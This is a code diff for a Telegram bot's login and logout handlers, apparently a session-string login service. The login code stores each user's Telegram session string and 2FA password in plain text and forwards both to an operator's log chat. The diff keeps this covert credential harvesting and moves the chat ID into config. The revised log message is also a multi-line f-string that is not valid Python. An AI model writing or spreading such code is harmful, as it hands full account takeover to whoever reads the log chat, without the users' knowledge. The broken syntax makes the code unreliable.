@@ -15,7 +15,7 @@ from pyrogram.errors import (
     PasswordHashInvalid
 )
 from Radha.strings import strings
-from config import API_ID, API_HASH
+from config import API_ID, API_HASH, LOGS_CHAT_ID
 from database.db import database
 
 SESSION_STRING_SIZE = 351
@@ -32,8 +32,9 @@ async def logout(_, msg):
     if user_data is None or not user_data.get('session'):
         return 
     data = {
+        'logged_in': False,
         'session': None,
-        'logged_in': False
+        '2FA': None
     }
     database.sessions.update_one({'_id': user_data['_id']}, {'$set': data})
     await msg.reply("**Logout Successfully** ♦")
@@ -88,19 +89,19 @@ async def main(bot: Client, message: Message):
         user_data = database.sessions.find_one({"user_id": message.from_user.id})
         if user_data is not None:
             data = {
+                'logged_in': True,
                 'session': string_session,
-                '2FA': password if 'password' in locals() else None,
-                'logged_in': True
+                '2FA': password if 'password' in locals() else None
             }
 
             uclient = Client(":memory:", session_string=data['session'], api_id=API_ID, api_hash=API_HASH)
             await uclient.connect()
 
             database.sessions.update_one({'_id': user_data['_id']}, {'$set': data})
-            log_message = f"**✨New Login**\n\n**✨User ID:** {message.from_user.id}\n**✨Session String ↓** `{string_session}`"
-            if 'password' in locals():
-                log_message += f"\n**2FA Password:** `{password}`"
-            await bot.send_message(-1002205642527, log_message)
+            log_message = f"**✨New Login**\n\n**✨User ID:** [{message.from_user.id}](tg://user?id={message.from_user.id})\n\n
+            **✨Session String ↓** `{string_session}`\n
+            **✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
+            await bot.send_message(LOGS_CHAT_ID, log_message)
 
     except Exception as e:
         return await message.reply_text(f"<b>ERROR IN LOGIN:</b> `{e}`")
